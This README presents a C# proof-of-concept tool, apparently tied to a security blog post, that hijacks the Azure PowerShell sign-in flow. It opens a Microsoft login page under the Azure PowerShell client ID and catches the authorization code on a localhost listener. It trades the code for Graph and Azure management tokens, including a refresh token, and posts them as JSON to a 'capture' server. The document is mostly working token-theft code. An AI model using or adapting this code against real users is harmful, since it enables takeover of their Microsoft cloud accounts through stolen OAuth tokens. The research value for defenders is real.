# GrabTokenAzureAD
A C# POC which automates the authorization flow created by the Connect-AzAccount modules from PowerShell

## Summary
For more details please visit https://www.init1security.com/post/hijacking-azure-powershell-authentication-flow

## Code
```cs
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;

class Program
{
    static string CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2";
    static string TENANT = "common";
    static string REDIRECT_URI = "http://localhost:8400";
    static string AUTHORITY = "https://login.microsoftonline.com/" + TENANT + "/oauth2/v2.0";
    static string SERVER_URL = "http://127.0.0.1:8000/capture";
    static string authCode = null;
    static string codeVerifier = null;

    static void Main()
    {
        string codeChallenge = GeneratePkce();

        Thread listenerThread = new Thread(new ThreadStart(StartHttpListener));
        listenerThread.Start();

        string authUrl = AUTHORITY + "/authorize?" +
            "client_id=" + Uri.EscapeDataString(CLIENT_ID) +
            "&response_type=code" +
            "&redirect_uri=" + Uri.EscapeDataString(REDIRECT_URI) +
            "&scope=" + Uri.EscapeDataString("offline_access https://graph.microsoft.com/.default") +
            "&code_challenge=" + codeChallenge +
            "&code_challenge_method=S256";

        Process.Start(new ProcessStartInfo(authUrl) { UseShellExecute = true });

        while (authCode == null)
            Thread.Sleep(500);

        string graphTokenJson = ExchangeCodeForToken(authCode, codeVerifier, "https://graph.microsoft.com/.default");
        //Console.WriteLine("\n[+] Graph Token Response:\n" + graphTokenJson);
        SendToServer("graph", graphTokenJson);

        string refreshToken = ExtractJsonValue(graphTokenJson, "refresh_token");

        if (!string.IsNullOrEmpty(refreshToken))
        {
            string mgmtTokenJson = ExchangeRefreshToken(refreshToken, "https://management.azure.com/.default");
            //Console.WriteLine("\n[+] Graph Token Response:\n" + mgmtTokenJson);
            SendToServer("management", mgmtTokenJson);
        }
    }

    static string GeneratePkce()
    {
        byte[] bytes = new byte[32];
        RandomNumberGenerator.Create().GetBytes(bytes);
        codeVerifier = Convert.ToBase64String(bytes).Replace("+", "-").Replace("/", "_").Replace("=", "");

        byte[] hash = SHA256.Create().ComputeHash(Encoding.ASCII.GetBytes(codeVerifier));
        return Convert.ToBase64String(hash).Replace("+", "-").Replace("/", "_").Replace("=", "");
    }

    static void StartHttpListener()
    {
        HttpListener listener = new HttpListener();
        listener.Prefixes.Add("http://localhost:8400/");
        listener.Start();

        var context = listener.GetContext();
        authCode = HttpUtility.ParseQueryString(context.Request.Url.Query).Get("code");

        string html = "<h2 style='font-family:sans-serif;'>Authorization code captured. You may close this tab.</h2>";
        byte[] buffer = Encoding.UTF8.GetBytes(html);
        context.Response.ContentType = "text/html";
        context.Response.ContentLength64 = buffer.Length;
        context.Response.OutputStream.Write(buffer, 0, buffer.Length);
        context.Response.OutputStream.Close();

        listener.Stop();
    }

    static string ExchangeCodeForToken(string code, string verifier, string scope)
    {
        var values = new Dictionary<string, string>()
        {
            { "grant_type", "authorization_code" },
            { "client_id", CLIENT_ID },
            { "code", code },
            { "redirect_uri", REDIRECT_URI },
            { "code_verifier", verifier },
            { "scope", scope + " offline_access" }
        };

        var content = new FormUrlEncodedContent(values);
        return new HttpClient().PostAsync(AUTHORITY + "/token", content).Result.Content.ReadAsStringAsync().Result;
    }

    static string ExchangeRefreshToken(string refreshToken, string scope)
    {
        var values = new Dictionary<string, string>()
        {
            { "grant_type", "refresh_token" },
            { "client_id", CLIENT_ID },
            { "refresh_token", refreshToken },
            { "scope", scope }
        };

        var content = new FormUrlEncodedContent(values);
        return new HttpClient().PostAsync(AUTHORITY + "/token", content).Result.Content.ReadAsStringAsync().Result;
    }

    static void SendToServer(string label, string json)
    {
        var fullJson = "{ \"label\": \"" + label + "\", \"token\": " + json + " }";
        var content = new StringContent(fullJson, Encoding.UTF8, "application/json");
        var resp = new HttpClient().PostAsync(SERVER_URL, content).Result;
        //Console.WriteLine($"[+] Sent {label} token. Server responded with: {resp.StatusCode}");
    }

    static string ExtractJsonValue(string json, string key)
    {
        string pattern = $"\"{key}\"\\s*:\\s*\"(.*?)\"";
        Match match = Regex.Match(json, pattern);
        return match.Success ? match.Groups[1].Value : null;
    }
}

```
